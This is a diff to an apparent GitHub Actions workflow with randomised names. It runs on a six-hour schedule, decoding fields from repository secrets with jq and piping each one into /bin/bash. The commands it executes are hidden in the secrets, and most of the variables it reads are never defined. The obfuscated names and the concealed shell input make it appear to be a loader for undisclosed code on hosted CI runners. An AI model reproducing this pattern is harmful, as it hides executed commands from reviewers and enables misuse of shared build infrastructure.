@@ -1,29 +1,28 @@
 name: xujiandu4675
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
-jobs:  # 8733
+    - cron: '55 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xujiandu4675
         env:
-          pdjd312: ${{ secrets.pdjd312 }}
+          gtzjs2140: ${{ secrets.gtzjs2140 }}
         run: |
-          echo $pdjd312 | jq -r .ahft649 | /bin/bash
-          echo $oy13 | jq -r .dox76481 | /bin/bash
-          echo $ad27996 | jq -r .h11126 | /bin/bash
-          echo $fxvxq3 | jq -r .zndg2073 | /bin/bash
-          echo $skwa50 | jq -r .u2 | /bin/bash
-          echo $wtx85015 | jq -r .kdtv2967 | /bin/bash
-          echo $j06522 | jq -r .gipu85 | /bin/bash
-          echo $z224 | jq -r .dcg85533 | /bin/bash
-          echo $kuzq861 | jq -r .bhj884 | /bin/bash
-          echo $bbcld7 | jq -r .mbkur3 | /bin/bash
-          echo $ioqo5 | jq -r .vfu794 | /bin/bash
-          echo $pym72 | jq -r .px8 | /bin/bash
-          echo $xsc5838 | jq -r .f856 | /bin/bash
-          echo $e2 | jq -r .uk1 | /bin/bash
+          echo $gtzjs2140 | jq -r .oxgw52 | /bin/bash
+          echo $y0126 | jq -r .yok82244 | /bin/bash
+          echo $ec76 | jq -r .mdz60785 | /bin/bash
+          echo $fnlv20 | jq -r .gk23103 | /bin/bash
+          echo $qbj1855 | jq -r .q83926 | /bin/bash
+          echo $vggdc0 | jq -r .bxpz6964 | /bin/bash
+          echo $ibkxe020 | jq -r .ztpua79259 | /bin/bash
+          echo $fimby5672 | jq -r .uulvm65 | /bin/bash
+          echo $scd61368 | jq -r .oml13 | /bin/bash
+          echo $qde48 | jq -r .q4413 | /bin/bash
+          echo $qbyux6 | jq -r .dkg3436 | /bin/bash
 
